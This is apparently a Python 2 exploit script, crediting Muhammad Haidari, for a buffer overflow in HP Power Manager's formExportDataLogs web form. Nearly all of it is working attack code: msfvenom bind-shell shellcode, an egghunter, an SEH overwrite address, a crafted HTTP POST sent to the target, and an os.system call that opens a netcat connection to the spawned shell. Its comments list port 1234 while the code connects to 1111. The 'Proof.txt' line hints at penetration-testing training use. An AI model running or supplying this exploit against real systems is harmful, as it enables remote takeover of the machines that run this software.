#!/usr/bin/python
print """
##//#############################################################################################################
##							##							#
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow	 		#
## 							##  HP Power Manager				 	#
## Vulnerable Application: HP Power Manager	 	##  This is a part of the Metasploit Module, 		#
## Tested on Windows [Version 6.1.7600] 		##  exploit/windows/http/hp_power_manager_filename	#
##							##							#
## Author: Muhammad Haidari				##  Spawns a shell to same window			#
## Contact: ghmh@outlook.com				##							#
## Website: www.github.com/muhammd			##							#
##							##							#
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python hpm_exploit.py <Remote IP Address>
"""
import urllib
import os
import sys
import struct
import time
from socket import *

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80

#msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.55 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python


egg="b33fb33f"
buf= egg
buf += b"\x33\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x39\x4f\x95\xe3\x83\xee\xfc\xe2\xf4\xc5\xa7"
buf += b"\x17\xe3\x39\x4f\xf5\x6a\xdc\x7e\x55\x87\xb2\x1f\xa5"
buf += b"\x68\x6b\x43\x1e\xb1\x2d\xc4\xe7\xcb\x36\xf8\xdf\xc5"
buf += b"\x08\xb0\x39\xdf\x58\x33\x97\xcf\x19\x8e\x5a\xee\x38"
buf += b"\x88\x77\x11\x6b\x18\x1e\xb1\x29\xc4\xdf\xdf\xb2\x03"
buf += b"\x84\x9b\xda\x07\x94\x32\x68\xc4\xcc\xc3\x38\x9c\x1e"
buf += b"\xaa\x21\xac\xaf\xaa\xb2\x7b\x1e\xe2\xef\x7e\x6a\x4f"
buf += b"\xf8\x80\x98\xe2\xfe\x77\x75\x96\xcf\x4c\xe8\x1b\x02"
buf += b"\x32\xb1\x96\xdd\x17\x1e\xbb\x1d\x4e\x46\x85\xb2\x43"
buf += b"\xde\x68\x61\x53\x94\x30\xb2\x4b\x1e\xe2\xe9\xc6\xd1"
buf += b"\xc7\x1d\x14\xce\x82\x60\x15\xc4\x1c\xd9\x10\xca\xb9"
buf += b"\xb2\x5d\x7e\x6e\x64\x27\xa6\xd1\x39\x4f\xfd\x94\x4a"
buf += b"\x7d\xca\xb7\x51\x03\xe2\xc5\x3e\xb0\x40\x5b\xa9\x4e"
buf += b"\x95\xe3\x10\x8b\xc1\xb3\x51\x66\x15\x88\x39\xb0\x40"
buf += b"\x89\x31\x16\xc5\x01\xc4\x0f\xc5\xa3\x69\x27\x7f\xec"
buf += b"\xe6\xaf\x6a\x36\xae\x27\x97\xe3\x3d\x18\x1c\x05\x53"
buf += b"\x5f\xc3\xb4\x51\x8d\x4e\xd4\x5e\xb0\x40\xb4\x51\xf8"
buf += b"\x7c\xdb\xc6\xb0\x40\xb4\x51\x3b\x79\xd8\xd8\xb0\x40"
buf += b"\xb4\xae\x27\xe0\x8d\x74\x2e\x6a\x36\x51\x2c\xf8\x87"
buf += b"\x39\xc6\x76\xb4\x6e\x18\xa4\x15\x53\x5d\xcc\xb5\xdb"
buf += b"\xb2\xf3\x24\x7d\x6b\xa9\xe2\x38\xc2\xd1\xc7\x29\x89"
buf += b"\x95\xa7\x6d\x1f\xc3\xb5\x6f\x09\xc3\xad\x6f\x19\xc6"
buf += b"\xb5\x51\x36\x59\xdc\xbf\xb0\x40\x6a\xd9\x01\xc3\xa5"
buf += b"\xc6\x7f\xfd\xeb\xbe\x52\xf5\x1c\xec\xf4\x75\xfe\x13"
buf += b"\x45\xfd\x45\xac\xf2\x08\x1c\xec\x73\x93\x9f\x33\xcf"
buf += b"\x6e\x03\x4c\x4a\x2e\xa4\x2a\x3d\xfa\x89\x39\x1c\x6a"
buf += b"\x36"



#tools/exploit/egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'

hunter =  ""
hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += "\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
hunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = "\x41" * (721 -len(hunter))
buffer +="\x90"*30 + hunter
buffer +="\xeb\xc2\x90\x90"           #JMP SHORT 0xC2 
buffer += "\xd5\x74\x41" 	      #pop esi # pop ebx # ret 10 (DevManBE.exe)
 

content= "dataFormat=comma&exportto=file&fileName=%s" % urllib.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print "[+] Payload Fired... She will be back in less than a min..."
s.send(payload)
print "[+] Give me 30 Sec!"
time.sleep(30)
os.system("nc -nv " + HOST +" 1111")
s.close()
print "[+] Did you get your Proof.txt file?!?"
#note if you didn't get a bindshell, you may have to bump it to a minute time.sleep(60).

